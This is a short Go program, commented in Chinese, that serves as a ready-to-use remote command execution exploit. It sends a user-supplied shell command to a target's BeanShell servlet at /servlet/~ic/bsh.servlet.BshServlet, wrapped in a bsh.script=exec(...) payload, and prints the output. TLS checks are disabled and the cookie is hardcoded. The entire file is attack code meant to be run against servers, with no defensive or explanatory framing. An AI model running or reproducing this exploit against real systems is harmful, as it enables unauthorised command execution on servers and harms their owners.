package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {

	var targetURL string
	var runCommand string
	/*创建变量*/
	flag.StringVar(&targetURL, "u", "", "http://www.example.com")
	flag.StringVar(&runCommand, "c", "", "whoami")
	flag.Parse()
	/*获取变量中的值*/
	if len(targetURL) == 0 {
		fmt.Println(errors.New("[x]未检测到参数 -u"))
		os.Exit(0)
	} else if len(runCommand) == 0 {
		fmt.Println(errors.New("[x]未检测到参数 -c"))
		os.Exit(0)
	}
	/*检测值是否未空*/
	fullCommand := `bsh.script=exec("` + runCommand + `")%0D%0A`
	/*构造payload*/
	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	request, err := http.NewRequest(http.MethodPost, targetURL+"/servlet/~ic/bsh.servlet.BshServlet", strings.NewReader(fullCommand))
	if err != nil {
		fmt.Println(err)
	}
	request.Header.Add("Cache-Control", "max-age=0")
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36")
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	request.Header.Add("Refer", targetURL)
	request.Header.Add("Cookie", "JSESSIONID=25E29F182B83C31ED990C4576D3E5893.server")
	request.Header.Add("Connection", "close")
	/*http请求体构建并忽略tls证书校验*/
	do, err := cli.Do(request)
	if err != nil {
		fmt.Println(err)
	} /*发送数据包*/
	defer func() {
		_ = do.Body.Close()
	}() /*资源释放*/
	if do.StatusCode != 200 {
		fmt.Println("invalid response code")
	} /*响应码检查*/
	all, err := ioutil.ReadAll(do.Body)
	if err != nil {
		fmt.Println(err)
	} /*读取响应中的html代码*/
	r := bytes.NewReader([]byte(all))
	doc, _ := goquery.NewDocumentFromReader(r)
	text := doc.Find("pre").Text()                   /*转换并匹配*/
	replace := strings.Replace(text, "null", "", -1) /*净化回显*/
	fmt.Printf("\r\n%s\r\n", replace)
}
